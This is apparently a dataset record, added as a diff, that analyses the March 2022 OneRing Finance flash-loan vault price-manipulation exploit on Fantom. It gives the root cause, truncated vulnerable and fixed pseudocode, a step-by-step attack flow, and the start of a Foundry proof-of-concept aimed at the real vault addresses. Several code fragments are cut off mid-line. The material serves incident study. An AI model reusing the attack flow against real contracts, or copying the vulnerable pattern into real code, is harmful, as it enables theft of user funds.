@@ -1,0 +1,33 @@
+{
+ "id": "2022__2022-03-21_OneRing_FlashLoanVaultPriceManipulation",
+ "source_file": "2022/2022-03-21_OneRing_FlashLoanVaultPriceManipulation.md",
+ "title": "OneRing Finance — Flash Loan Vault Price Manipulation Analysis",
+ "date": "2022-03-21",
+ "protocol": "OneRing Finance",
+ "chain": "Fantom",
+ "loss_raw": "~$1,450,000 (USDC)",
+ "loss_usd": 1450000.0,
+ "root_cause": "Share issuance in `depositSafe()` is calculated using `pricePerShare()` based on the current block's `totalAssets` (spot balance), enabling profit through a large deposit followed by immediate withdrawal within the same transaction",
+ "attack_tx": null,
+ "vulnerable_contract": "OneRing Vault 0x4e332D616b5bA1eDFd87c899E534D996c336a2FC",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable OneRingVault (pseudocode)\ncontract OneRingVault {\n    IERC20 public usdc;\n    uint256 public totalShares;\n    uint256 public totalAssets; // Total USDC in the vault\n\n    //",
+  "❌ pricePerShare is calculated based on current (spot) assets\n    function pricePerShare() public view returns (uint256) {\n        if (totalShares == 0) return 1e6; // initial value\n        return totalAssets * 1e6 / totalShares;\n    }\n\n    //",
+  "❌ shares calculated against flash-loan-inflated totalAssets\n    function depositSafe(uint256 amount) external {\n        uint256 shares = amount * 1e6 / pricePerShare();\n        //"
+ ],
+ "code_after": [
+  "✅ Correct pattern\ncontract OneRingVaultFixed {\n    //",
+  "✅ Apply the same basis for shares received on deposit and assets returned on withdrawal\n    //"
+ ],
+ "steps": [
+  "→ pricePerShare spikes sharply",
+  "→ deposit 80M and receive more USDC back"
+ ],
+ "other_code": [
+  "Attacker Contract\n    │\n    ├─[1] Uniswap V2 flash swap: borrow 80,000,000 USDC\n    │       pair.swap(80_000_000 * 1e6, 0, address(this), \"0x\")\n    │\n    ├─[2] [Inside flash loan callback]\n    │       │\n    │       ├─[3] USDC.approve(vault, 80M)\n    │       │\n    │       ├─[4] vault.depositSafe(80_000_000 * 1e6)\n    │       │       Vault USDC assets = existing + 80M\n    │       │       pricePerShare = (existing assets + 80M) / totalShares\n    │       │       → pricePerShare spikes sharply\n    │       │       Minted shares = 80M / inflated pricePerShare\n    │       │                     = far fewer shares than normal\n    │       │\n    │       ├─[5] vault.withdraw(all held shares)\n    │       │       Returned USDC = shares × current pricePerShare\n    │       │       ⚡ pricePerShare still hig",
+  "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\n\ninterface IOneRingVault {\n    function depositSafe(uint256 amount) external;\n    function withdraw(uint256 shares) external;\n}\n\ninterface IUniswapV2Pair {\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n}\n\ncontract ContractTest is Test {\n    IUniswapV2Pair pair =\n        IUniswapV2Pair(0xbcab7d083Cf6a01e0DdA9ed7F8a02b47d125e682);\n    IERC20 USDC         = IERC20(0x04068DA6C83AFCFA0e13ba15A6696662335D5B75);\n    IOneRingVault vault = IOneRingVault(0x4e332D616b5bA1eDFd87c899E534D996c336a2FC);\n\n    function setUp() public {\n        vm.createSelectFork(\"fantom\", 34_041_499);\n    }\n\n    function testExploit() public {\n        emit log_named_decimal_uint(\"[B"
+ ]
+}
